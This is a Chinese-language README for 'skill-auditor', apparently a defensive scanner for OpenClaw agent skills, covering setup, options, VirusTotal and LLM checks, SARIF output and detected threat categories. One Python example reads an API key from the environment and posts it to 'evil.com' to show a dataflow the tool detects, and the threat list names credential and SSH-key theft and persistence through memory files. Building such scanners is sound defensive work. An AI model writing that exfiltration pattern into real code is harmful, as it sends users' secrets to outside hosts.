---
name: skill-auditor
version: 2.1.3
description: "这是一款安全扫描工具，能够在恶意行为窃取您的数据之前将其拦截。它能够检测到凭证盗窃、代码注入（prompt injection）以及隐藏的后门（hidden backdoors）等安全威胁。该工具无需任何配置即可立即使用。此外，它还提供了可选的AST（Abstract Syntax Tree）数据流分析功能，可追踪您的数据在代码中的传输路径。"
---

# Skill Auditor v2.1

这是一个增强型的安全扫描工具，能够分析各种技能（skills）并利用先进的分析能力提供全面的威胁检测服务。

## 安装完成后

运行设置向导来配置可选功能：

```bash
cd skills/skill-auditor
node scripts/setup.js
```

该向导会解释每个功能的用途，展示实际测试数据，并允许您选择要启用的功能。

## 快速入门

**扫描某个技能：**
```bash
node skills/skill-auditor/scripts/scan-skill.js <skill-directory>
```

**审计所有已安装的技能：**
```bash
node skills/skill-auditor/scripts/audit-installed.js
```

## 建议使用设置向导

运行交互式设置向导来配置可选功能：

```bash
cd skills/skill-auditor
node scripts/setup.js
```

向导将执行以下操作：
1. **检测您的操作系统**（Windows、macOS、Linux）
2. **检查Python是否已安装**（AST分析所需）
3. **提供安装tree-sitter的选项**（用于数据流分析）
4. **配置技能安装时的自动扫描功能**
5. **将偏好设置保存到`~/.openclaw/skill-auditor.json`文件中**

### 设置命令

```bash
node scripts/setup.js           # Interactive setup wizard
node scripts/setup.js --status  # Show current configuration
node scripts/setup.js --enable-ast  # Just enable AST analysis
```

## 审计所有已安装的技能

一次性扫描OpenClaw安装中的所有技能：

```bash
node scripts/audit-installed.js
```

**选项：**
```bash
node scripts/audit-installed.js --severity critical  # Only critical issues
node scripts/audit-installed.js --json               # Save results to audit-results.json
node scripts/audit-installed.js --verbose            # Show top findings per skill
```

**输出结果：**
- 风险等级（🚨 严重、⚠️ 高风险、📋 中等、✅ 无风险）
- 统计信息（总扫描次数、按风险等级分类）
- 高风险技能的详细列表及其功能

## 跨平台安装

### 核心扫描功能（无需额外依赖）

仅需Node.js（OpenClaw已提供）即可在所有平台上运行。

### AST分析（可选）

需要Python 3.8及以上版本以及tree-sitter包。

| 平台 | Python安装 | Tree-sitter安装 |
|----------|----------------|---------------------|
| **Windows** | 已预装或使用`winget install Python.Python.3` | `pip install tree-sitter tree-sitter-python` |
| **macOS** | 已预装或使用`brew install python3` | `pip3 install tree-sitter tree-sitter-python` |
| **Linux** | `apt install python3-pip` | `pip3 install tree-sitter tree-sitter-python` |

**注意：**Tree-sitter为所有平台提供了预编译的安装包——无需C++编译器！

## 核心功能（始终可用）

- **静态模式分析**——基于正则表达式的40多种威胁模式检测
- **意图匹配**——根据技能的描述进行上下文分析
- **准确性评分**——评估行为与描述的匹配程度（1-10分）
- **风险评估**——分为无风险、低风险、中等风险、高风险、严重风险
- **OpenClaw特定功能**——能够检测MEMORY.md文件、会话工具以及代理程序的操控行为
- **远程扫描**——支持通过scan-url.js扫描GitHub上的代码
- **可视化报告**——提供易于阅读的威胁摘要

## 高级功能（可选）

### 1. Python AST数据流分析
**通过代码执行路径追踪数据流动**

```bash
npm install tree-sitter tree-sitter-python
node scripts/scan-skill.js <skill> --mode strict
```

**检测内容：**
- 环境变量 → 网络请求
- 文件读取 → HTTP请求
- 内存文件访问 → 外部API调用
- 跨函数的数据流动

**示例：**
```python
# File 1: utils.py
def get_secrets(): return os.environ.get('API_KEY')

# File 2: main.py  
key = get_secrets()
requests.post('evil.com', data=key)  # ← Dataflow detected!
```

### 2. VirusTotal二进制文件扫描
**使用70多种杀毒引擎扫描可执行文件**

```bash
export VIRUSTOTAL_API_KEY="your-key-here"
node scripts/scan-skill.js <skill> --use-virustotal
```

**支持的文件格式：**.exe、.dll、.bin、.wasm、.jar、.apk等

**输出内容：**
- 恶意软件检测结果
- 杀毒引擎的检测结果（例如：“3/70个引擎标记为恶意文件”）
- VirusTotal的检测报告链接
- 文件的SHA256哈希值（用于验证）

### 3. LLM语义分析
**利用人工智能判断检测到的行为是否与技能描述相符**

```bash
# Requires OpenClaw gateway running
node scripts/scan-skill.js <skill> --use-llm
```

**工作原理：**
1. 按类别整理检测结果
2. 向大型语言模型（LLM）询问：“该行为是否符合技能的描述？”
3. 根据语义分析结果调整风险等级
4. 提供置信度评分

**示例：**
- **检测结果：**“访问了MEMORY.md文件”
- **技能描述：**“优化代理程序的内存使用”
- **LLM判断：**“合法行为——符合技能描述”
- **结果：**风险等级降低，标记为“合法”

### 4. SARIF输出格式（适用于CI/CD流程）

**兼容GitHub的代码扫描格式**

```bash
node scripts/scan-skill.js <skill> --format sarif --fail-on-findings
```

**GitHub集成方式：**
```yaml
# .github/workflows/skill-scan.yml
- name: Scan Skills
  run: |
    node skill-auditor/scripts/scan-skill.js ./skills/new-skill \
      --format sarif --fail-on-findings > results.sarif
- name: Upload SARIF
  uses: github/codeql-action/upload-sarif@v2
  with:
    sarif_file: results.sarif
```

### 5. 检测模式**
**可调节的敏感度设置**

```bash
--mode strict      # All patterns, higher false positives
--mode balanced    # Default, optimized accuracy  
--mode permissive  # Only critical patterns
```

## 使用示例

### 基本扫描
```bash
# Scan local skill
node scripts/scan-skill.js ../my-skill

# Scan with JSON output
node scripts/scan-skill.js ../my-skill --json report.json

# Format visual report
node scripts/format-report.js report.json
```

### 高级扫描
```bash
# Full analysis with all features
node scripts/scan-skill.js ../my-skill \
  --mode strict \
  --use-virustotal \
  --use-llm \
  --format sarif \
  --json full-report.sarif

# CI/CD integration
node scripts/scan-skill.js ../my-skill \
  --format sarif \
  --fail-on-findings \
  --mode balanced
```

### 远程扫描
```bash
# Scan GitHub skill without cloning
node scripts/scan-url.js "https://github.com/user/skill" --json remote-report.json
node scripts/format-report.js remote-report.json
```

## 安装选项

### 无依赖（推荐用于持续集成环境）

```bash
# Works immediately — no installation needed
node skill-auditor/scripts/scan-skill.js <skill>
```

### 可选的高级功能
```bash
cd skills/skill-auditor

# Install all optional features
npm install

# Or install selectively:
npm install tree-sitter tree-sitter-python  # AST analysis
npm install yara                            # YARA rules (future)

# VirusTotal requires API key only:
export VIRUSTOTAL_API_KEY="your-key"

# LLM analysis requires OpenClaw gateway:
openclaw gateway start
```

## 检测内容

### 核心威胁类别
- **提示注入**——尝试操控用户输入
- **数据泄露**——未经授权的数据传输
- **敏感文件访问**——包括MEMORY.md文件、凭证信息、SSH密钥
- **shell命令执行**——命令注入、任意代码执行
- **路径遍历**——目录遍历攻击
- **代码混淆**——隐藏/加密的代码
- **持久化攻击**——对系统进行修改以实现长期访问
- **权限提升**——浏览器自动化操作、设备控制

### OpenClaw特有的检测模式
- **内存文件写入**——通过MEMORY.md、AGENTS.md文件实现持久化攻击
- **会话工具滥用**——通过sessions_send功能进行数据泄露
- **网关控制**——配置修改、重启命令
- **设备访问**——包括摄像头截图、屏幕录制、位置信息获取

### 高级检测（需启用可选功能）

- **Python数据流分析**——跨函数/文件的变量追踪
- **二进制恶意文件**——通过VirusTotal检测已知恶意文件
- **语义意图分析**——利用人工智能分析行为与技能描述的匹配程度

## 输出格式

### 1. JSON（默认格式）
```json
{
  "skill": { "name": "example", "description": "..." },
  "riskLevel": "HIGH", 
  "accuracyScore": { "score": 7, "reason": "..." },
  "findings": [...],
  "summary": { "analyzersUsed": ["static", "ast-python", "llm-semantic"] }
}
```

### 2. SARIF格式（适用于GitHub代码扫描）
```bash
--format sarif
```
支持上传到GitHub的安全检查页面，可与拉取请求（pull request）集成

### 3. 可视化报告
```bash
node scripts/format-report.js report.json
```
提供易于阅读的威胁摘要以及可采取的操作建议。

## 配置选项

### 环境变量设置
```bash
VIRUSTOTAL_API_KEY="vt-key"     # VirusTotal integration
DEBUG="1"                       # Verbose error output
```

### 命令行参数设置
```bash
--json <file>         # JSON output file
--format sarif        # SARIF output for GitHub
--mode <mode>         # strict|balanced|permissive  
--use-virustotal     # Enable binary scanning
--use-llm           # Enable semantic analysis
--custom-rules <dir> # Additional YARA rules
--fail-on-findings  # Exit code 1 for HIGH/CRITICAL
--help              # Show all options
```

## 架构概述

```
skill-auditor/
├── scripts/
│   ├── scan-skill.js         # Main scanner (v2.0)
│   ├── scan-url.js           # Remote GitHub scanning  
│   ├── format-report.js      # Visual report formatter
│   ├── analyzers/            # Pluggable analysis engines
│   │   ├── static.js         # Core regex patterns (zero-dep)
│   │   ├── ast-python.js     # Python dataflow analysis
│   │   ├── virustotal.js     # Binary malware scanning
│   │   └── llm-semantic.js   # AI-powered intent analysis
│   └── utils/
│       └── sarif.js          # GitHub Code Scanning output
├── rules/
│   └── default.yar           # YARA format patterns
├── package.json              # Optional dependencies
└── references/              # Documentation (unchanged)
```

## 向后兼容性

**v1.x版本的命令可以正常使用：**
```bash
node scan-skill.js <skill-dir>                    # ✅ Works
node scan-skill.js <skill-dir> --json out.json    # ✅ Works  
node format-report.js out.json                    # ✅ Works
```

**v2.0的新功能为可选配置：**
```bash
node scan-skill.js <skill-dir> --use-llm          # ⚡ Enhanced
node scan-skill.js <skill-dir> --use-virustotal   # ⚡ Enhanced
```

## 限制

### 核心扫描功能

- **新型混淆技术**——某些新型混淆技术尚未被纳入检测模式
- **二进制文件分析**——除非启用了VirusTotal，否则不会扫描二进制文件
- **复杂的提示注入攻击**——某些高级操控技巧可能逃避正则表达式的检测

### 可选功能

- **Python AST分析**——仅限于Python文件，且仅支持基本的数据流分析
- **VirusTotal扫描**——免费 tier每天仅支持500次查询
- **LLM分析**——需要网络连接和OpenClaw网关
- **YARA规则**——框架已准备好，但自定义规则尚未完全实现

## 故障排除

### 常见问题

- **“tree-sitter依赖项未找到”**
```bash
npm install tree-sitter tree-sitter-python
```

- **“VirusTotal API错误：403”**
```bash
export VIRUSTOTAL_API_KEY="your-actual-key"
```

- **“LLM语义分析失败”**
```bash
# Check OpenClaw gateway is running:
openclaw gateway status
curl http://localhost:18789/api/v1/health
```

- **“未生成SARIF输出”**
```bash
# Ensure all dependencies installed:
cd skills/skill-auditor && npm install
```

### 调试模式
```bash
DEBUG=1 node scripts/scan-skill.js <skill>
```

## 贡献方式

### 添加新的检测规则

- **静态检测规则**——编辑`scripts/analyzers/static.js`
- **YARA规则**——添加到`rules/`目录
- **Python数据流分析**——扩展`scripts/analyzers/ast-python.js`

### 新功能的测试方法
```bash
# Test against multiple skills:
node scripts/scan-skill.js ../blogwatcher --use-llm --mode strict
node scripts/scan-skill.js ../summarize --use-virustotal  
node scripts/scan-skill.js ../secure-browser-agent --format sarif
```

## 安全提示

**本扫描工具仅作为防御手段之一，并不能提供绝对的安全保障。**请务必：
- 手动审查代码以发现新型攻击
- 在技能更新后重新扫描
- 使用多种安全工具进行检测
- 即使使用高级功能，也要保持警惕

**对于敏感环境**，建议启用所有高级功能：
```bash
node scripts/scan-skill.js <skill> \
  --mode strict \
  --use-virustotal \
  --use-llm \
  --fail-on-findings
```